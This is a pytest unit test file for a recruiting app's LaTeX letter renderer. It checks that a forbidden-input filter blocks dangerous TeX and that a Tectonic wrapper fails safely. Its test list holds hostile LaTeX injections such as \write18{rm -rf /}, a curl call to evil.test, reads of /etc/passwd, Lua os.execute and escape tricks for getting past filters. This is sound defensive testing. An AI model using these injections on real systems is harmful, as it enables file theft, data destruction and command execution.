"""letters/tasks.py pieces that need no database (P2-20): the forbidden-input check and the
Tectonic subprocess wrapper (driven by tiny fake `tectonic` scripts, never the real binary)."""

import stat
from pathlib import Path

import pytest

from recruitai.modules.letters.tasks import RenderError, check_tex_allowed, compile_tex
from recruitai.modules.letters.templates import render_tex
from tests.unit.test_letters_latex import TEMPLATES, _content


@pytest.mark.parametrize(
    "tex",
    [
        r"\write18{rm -rf /}",
        r"\immediate\write18{curl evil.test}",
        r"\input{/etc/passwd}",
        r"\input{../../secret}",
        r"\include{other}",
        r"\openin5=/etc/passwd",
        r"\openout3=out.txt",
        r"\catcode`\~=0",
        r"\csname write\endcsname",
        r"^^5cwrite18{x}",  # a backslash spelled in hex
        r"\InputIfFileExists{/etc/passwd}{}{}",
        r"\directlua{os.execute('x')}",
    ],
)
def test_dangerous_commands_are_rejected_before_compiling(tex):
    with pytest.raises(RenderError) as err:
        check_tex_allowed("\\documentclass{article}\n\\begin{document}\n" + tex)
    assert err.value.code == "render_forbidden_input" and not err.value.retryable


@pytest.mark.parametrize("template", TEMPLATES)
def test_the_real_templates_pass_the_check(template):
    check_tex_allowed(render_tex(_content(), template=template, language="fr"))
    # lookalike control words are fine: \inputenc, \readme are not \input / \read
    check_tex_allowed(r"\usepackage[utf8]{inputenc} \textbf{readme}")


def _fake_tectonic(tmp_path: Path, body: str) -> str:
    script = tmp_path / "tectonic"
    # argv: -X compile --untrusted --outdir DIR FILE
    script.write_text("#!/bin/sh\n" + body)
    script.chmod(script.stat().st_mode | stat.S_IEXEC)
    return str(script)


async def test_compile_returns_the_pdf_and_passes_the_untrusted_flag(tmp_path):
    args_file = tmp_path / "args.txt"
    binary = _fake_tectonic(
        tmp_path,
        f'echo "$@" > {args_file}\nprintf "%%PDF-1.4 fake" > "$5/letter.pdf"\n',
    )
    pdf = await compile_tex("\\documentclass{article}", binary=binary)
    assert pdf.startswith(b"%PDF-")
    assert "--untrusted" in args_file.read_text()


async def test_compile_failure_timeout_and_missing_binary_are_safe_retryable_errors(
    tmp_path,
):
    failing = _fake_tectonic(tmp_path, "echo secret detail >&2\nexit 1\n")
    with pytest.raises(RenderError) as err:
        await compile_tex("x", binary=failing)
    assert (err.value.code, err.value.retryable) == ("render_failed", True)
    assert "secret" not in str(err.value)

    no_output = _fake_tectonic(tmp_path, "exit 0\n")  # exit 0 but no PDF
    with pytest.raises(RenderError) as err:
        await compile_tex("x", binary=no_output)
    assert err.value.code == "render_failed"

    slow = _fake_tectonic(tmp_path, "sleep 30\n")
    with pytest.raises(RenderError) as err:
        await compile_tex("x", binary=slow, timeout_s=0.3)
    assert err.value.code == "render_timeout"

    with pytest.raises(RenderError) as err:
        await compile_tex("x", binary=str(tmp_path / "does-not-exist"))
    assert (err.value.code, err.value.retryable) == ("render_unavailable", False)
